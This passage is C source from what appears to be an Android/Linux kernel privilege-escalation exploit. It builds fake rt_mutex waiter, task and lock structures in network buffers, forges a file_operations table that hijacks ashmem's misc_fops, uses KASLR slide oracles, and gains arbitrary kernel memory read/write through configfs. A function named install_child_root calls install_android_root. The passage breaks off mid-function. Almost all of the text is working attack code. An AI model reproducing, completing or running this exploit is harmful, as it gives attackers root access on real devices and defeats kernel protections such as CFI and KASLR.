#include "common.h"

#if defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t slide_bank_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
static uintptr_t slide_bank_payload_base;
static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];

_Static_assert(
    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_TASK_STRIDE +
            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
        SLIDE_BANK_LOCK_OFF,
    "slide task bank overlaps lock bank");
_Static_assert(
    SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "slide lock bank exceeds reclaimed page");
#if defined(FOPS_TABLE_MIRROR_OFF)
_Static_assert(
    FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
    "mirrored FOPS table overlaps primary FOPS table");
#endif
#endif

void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                     uintptr_t tree_parent, uintptr_t tree_right,
                     uintptr_t tree_left, uintptr_t pi_parent,
                     uintptr_t pi_right, uintptr_t pi_left,
                     uintptr_t task, uintptr_t lock,
                     uint32_t priority) {
  put64(payload, waiter_off + 0x00, tree_parent);
  put64(payload, waiter_off + 0x08, tree_right);
  put64(payload, waiter_off + 0x10, tree_left);
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
#if COMPACT_RT_MUTEX_WAITER
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
#endif
  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
#if COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
#else
  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

#if !defined(PHYS_P0_ORACLE) || !PHYS_P0_ORACLE || SLIDE_USE_PSELECT
void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}
#endif

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

#if defined(SLIDE_P0_OFFSET_CANDIDATES)
int select_slide_payload_slot(uintptr_t offset) {
  if (!slide_bank_payload_base) {
    return 0;
  }
  for (size_t i = 0;
       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
    if (slide_bank_offsets[i] != offset) {
      continue;
    }
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
    return select_slide_payload_index(1);
#else
    return select_slide_payload_index(i);
#endif
  }
  return 0;
}

int select_slide_payload_index(size_t index) {
  if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
    return 0;
  }
  fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
              index * SLIDE_BANK_TASK_STRIDE;
  fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
              index * SLIDE_BANK_SLOT_STRIDE;
  fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
  slide_oracle_parent = slide_bank_parents[index];
  slide_oracle_target = slide_bank_targets[index];
  return 1;
}

static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
                                 size_t slot, uintptr_t parent,
                                 uintptr_t target) {
  size_t task_off = SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
  size_t lock_off = SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
  size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
  uintptr_t task = payload_base + task_off;
  uintptr_t lock = payload_base + lock_off;
  uintptr_t waiter = payload_base + waiter_off;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = target;
  uintptr_t lock_owner = SLIDE_LOCK_OWNER_VALUE;
  uintptr_t waiter_task = task;
  uintptr_t task_group = 0;
  uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
  uintptr_t pi_top_task = task;
  uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;

#if defined(P0_ORACLE_PRODUCTION_SLOT)
  if (slot == P0_ORACLE_PRODUCTION_SLOT) {
#if defined(PRODUCTION_SLOT_PI_RIGHT) && \
    PRODUCTION_SLOT_PI_RIGHT
    pi_right = target;
    pi_left = 0;
#elif defined(PRODUCTION_SLOT_PROVEN_LEFT) && \
    PRODUCTION_SLOT_PROVEN_LEFT
    pi_right = 0;
    pi_left = target;
#endif
#if defined(PRODUCTION_SLOT_FULL_FOPS_GEOMETRY) && \
    PRODUCTION_SLOT_FULL_FOPS_GEOMETRY
    lock_owner = task | 1;
    waiter_task = text_addr(INIT_TASK);
    task_group = text_addr(ROOT_TASK_GROUP);
    pi_waiters = 0;
    pi_top_task = text_addr(INIT_TASK);
    waiter_prio = FAKE_WAITER_PRIO;
#endif
  }
#endif

  put32(p, lock_off + 0x00, 0);
  put64(p, lock_off + 0x08, waiter);
  put64(p, lock_off + 0x10, waiter);
  put64(p, lock_off + 0x18, lock_owner);
  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
                  waiter_task, lock, waiter_prio);
  put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
  put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
  put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
  put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
}
#endif

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

#if defined(SLIDE_P0_OFFSET_CANDIDATES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    slide_bank_payload_base = payload_base;
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
        uintptr_t parent;
        uintptr_t target;
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
        if (slot == P0_ORACLE_GATE_SLOT) {
          parent = direct_to_page(base);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
          p0_gate_page_struct = parent;
        } else if (slot == P0_ORACLE_PROBE_SLOT) {
          uintptr_t direct_addr =
              P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
              P0_ORACLE_PROBE_OFFSET;
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
          if (p0_virtual_base_probe) {
            direct_addr = data_addr(ASHMEM_MISC_FOPS);
          }
#endif
          parent = direct_to_page(direct_addr);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
                   sizeof(struct user_pipe_buffer);
          p0_probe_page_struct = parent;
        } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
          parent = p0_gate_page_struct;
          target = 0;
        } else {
          parent = p0_probe_page_struct;
          target = 0;
        }
#else
        uintptr_t offset = slide_bank_offsets[slot];
        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
#endif
        slide_bank_parents[slot] = parent;
        slide_bank_targets[slot] = target;
        size_t task_off = SLIDE_BANK_TASK_OFF +
                          slot * SLIDE_BANK_TASK_STRIDE;
        size_t lock_off = SLIDE_BANK_LOCK_OFF +
                          slot * SLIDE_BANK_SLOT_STRIDE;
        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
        uintptr_t task = payload_base + task_off;
        uintptr_t lock = payload_base + lock_off;
        uintptr_t waiter = payload_base + waiter_off;

        put32(p, lock_off + 0x00, 0);
        put64(p, lock_off + 0x08, waiter);
        put64(p, lock_off + 0x10, waiter);
        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);

        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                        lock, SLIDE_FAKE_WAITER_PRIO);

        put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
        put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
        put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
        put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
      }
    }
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
    return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
#else
    return select_slide_payload_slot(slide_bank_offsets[0]);
#endif
  }
#endif

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
#if !defined(CLOSED_FOPS_ROUTE) || !CLOSED_FOPS_ROUTE
    slide_bank_payload_base = payload_base;
#if defined(FOPS_ORACLE_DIAG_ONLY) && FOPS_ORACLE_DIAG_ONLY
    p0_gate_page_struct = direct_to_page(base);
    slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_GATE_SLOT] =
        pipebuf_page_base +
        P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
    slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_PROBE_SLOT] = 0;
#elif defined(FOPS_DATA_ALIAS_DIAG_ONLY) && \
    FOPS_DATA_ALIAS_DIAG_ONLY
    if (fops_data_probe_active) {
      p0_gate_page_struct = direct_to_page(base);
      p0_probe_page_struct =
          direct_to_page(fops_data_probe_addr & ~(PAGE_SIZE - 1));
      slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
      slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
          sizeof(struct user_pipe_buffer);
      slide_bank_parents[P0_ORACLE_GATE_RESTORE_SLOT] =
          p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_RESTORE_SLOT] = 0;
      slide_bank_parents[P0_ORACLE_PROBE_RESTORE_SLOT] =
          p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_RESTORE_SLOT] = 0;
#if defined(FOPS_REUSE_VERIFIED_PAGE) && \
    FOPS_REUSE_VERIFIED_PAGE
      slide_bank_parents[P0_ORACLE_PRODUCTION_SLOT] = fake_fops;
      slide_bank_targets[P0_ORACLE_PRODUCTION_SLOT] =
          data_addr(ASHMEM_MISC_FOPS);
#endif
    } else {
      slide_bank_parents[0] = fake_fops;
      slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
    }
#else
    slide_bank_parents[0] = fake_fops;
    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
#endif
#else
    slide_oracle_parent = fake_fops;
    slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
#endif
  }
#endif
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

#ifdef SLIDE_RECLAIM_SCAN_PHASE
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk;
      for (size_t off = SLIDE_RECLAIM_SCAN_PHASE;
           off + 0x20 <= ORDER3_SIZE; off += 0x20) {
        put64(p, off + 0x08, 0x4141000000000000ULL | off);
      }
    }
    return 1;
  }
#endif

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  uint32_t waiter_prio = FAKE_WAITER_PRIO;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
    write_right = 0;
    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    waiter_task = fake_task;
    task_group = 0;
    pi_top_task = fake_task;
#else
    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
#endif
    waiter_prio = SLIDE_FAKE_WAITER_PRIO;
  }

  for (size_t chunk = 0;
       chunk + SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
       chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
                    waiter_task, fake_lock, waiter_prio);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
#if defined(FOPS_TABLE_MIRROR_OFF)
      put_fake_fops_table(p, FOPS_TABLE_MIRROR_OFF);
#endif
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE && \
    (!defined(CLOSED_FOPS_ROUTE) || !CLOSED_FOPS_ROUTE)
#if defined(FOPS_ORACLE_DIAG_ONLY) && FOPS_ORACLE_DIAG_ONLY
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_GATE_SLOT,
          slide_bank_parents[P0_ORACLE_GATE_SLOT],
          slide_bank_targets[P0_ORACLE_GATE_SLOT]);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_PROBE_SLOT,
          slide_bank_parents[P0_ORACLE_PROBE_SLOT],
          slide_bank_targets[P0_ORACLE_PROBE_SLOT]);
#elif defined(FOPS_DATA_ALIAS_DIAG_ONLY) && \
    FOPS_DATA_ALIAS_DIAG_ONLY
      if (fops_data_probe_active) {
        memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
        for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
          put_slide_bank_entry(p, payload_base, slot,
                               slide_bank_parents[slot],
                               slide_bank_targets[slot]);
        }
      } else {
        put_slide_bank_entry(p, payload_base, 0,
                             slide_bank_parents[0],
                             slide_bank_targets[0]);
      }
#else
      put_slide_bank_entry(p, payload_base, 0,
                           slide_bank_parents[0],
                           slide_bank_targets[0]);
#endif
#endif
    }
  }
  return 1;
}

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int one_page_span(uintptr_t start, size_t len) {
  if (!len || start > UINTPTR_MAX - (len - 1)) {
    return 0;
  }
  return (start >> PAGE_SHIFT) == ((start + len - 1) >> PAGE_SHIFT);
}

static int audit_fake_fops_table(int fd) {
  enum { span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
  _Static_assert(span % sizeof(uint64_t) == 0, "fops span alignment");
  uint64_t table[span / sizeof(uint64_t)];
  if (!one_page_span(fake_fops, sizeof(table))) {
    pr_warning("cfi fake fops crosses page start=%016zx size=%zu\n",
               fake_fops, sizeof(table));
    return 0;
  }
  ssize_t rd = configfs_read_once(fd, fake_fops, table, sizeof(table));
  if (rd != (ssize_t)sizeof(table)) {
    pr_warning("cfi fake fops read failed ret=%zd start=%016zx size=%zu errno=%d\n",
               rd, fake_fops, sizeof(table), errno);
    return 0;
  }
  struct expected_slot {
    size_t off;
    uint64_t value;
  } expected[] = {
    {FOPS_OWNER_OFF, 0},
    {FOPS_LLSEEK_OFF, data_addr(ASHMEM_MISC_FOPS)},
    {FOPS_READ_OFF, 0},
    {FOPS_WRITE_OFF, 0},
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };
  for (size_t i = 0; i < sizeof(expected) / sizeof(expected[0]); ++i) {
    uint64_t got = table[expected[i].off / sizeof(uint64_t)];
    if (got != expected[i].value) {
      pr_warning("cfi fake fops slot mismatch off=0x%zx got=%016llx want=%016llx\n",
                 expected[i].off, (unsigned long long)got,
                 (unsigned long long)expected[i].value);
      return 0;
    }
  }
  return 1;
}

static int fake_fops_owner_is_zero(int fd) {
  uint64_t owner = UINT64_MAX;
  ssize_t rd = configfs_read_once(
      fd, fake_fops + FOPS_OWNER_OFF, &owner, sizeof(owner));
  cfi_owner_ret = rd;
  if (rd != (ssize_t)sizeof(owner) || owner != 0) {
    pr_warning("cfi fake fops owner mismatch ret=%zd value=%016llx errno=%d\n",
               rd, (unsigned long long)owner, errno);
    return 0;
  }
  return 1;
}


int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t before = 0;
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  if (!one_page_span(slot, sizeof(llseek))) {
    errno = ERANGE;
    return 0;
  }
  ssize_t before_rd = configfs_read_once(
      fd, slot, &before, sizeof(before));
  if (before_rd != (ssize_t)sizeof(before)) {
    return 0;
  }
  pr_info("cfi llseek before=%016llx want=%016llx slot=%016zx\n",
          (unsigned long long)before, (unsigned long long)llseek, slot);
  if (before == llseek) {
    return 1;
  }
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr =
      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
               "read=%016llx want=%016zx errno=%d\n",
               pre_rb, misc_fops, (unsigned long long)pre_fops,
               fake_fops, errno);
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!audit_fake_fops_table(fd)) {
    cfi_last_step = 12;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  unsigned char payload_before[sizeof(payload)];
  if (!one_page_span(binwrite_target, sizeof(payload)) ||
      configfs_read_once(fd, binwrite_target, payload_before,
                         sizeof(payload_before)) !=
          (ssize_t)sizeof(payload_before)) {
    cfi_last_step = 13;
    cfi_last_errno = errno;
    goto fail;
  }
  for (size_t i = 0; i < sizeof(payload_before); ++i) {
    if (payload_before[i] != 0) {
      pr_warning("cfi scratch not zero target=%016zx off=0x%zx value=0x%02x\n",
                 binwrite_target, i, payload_before[i]);
      cfi_last_step = 13;
      cfi_last_errno = 0;
      goto fail;
    }
  }
  pr_info("cfi scratch span=%016zx-%016zx old=zero size=%zu\n",
          binwrite_target, binwrite_target + sizeof(payload) - 1,
          sizeof(payload));
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
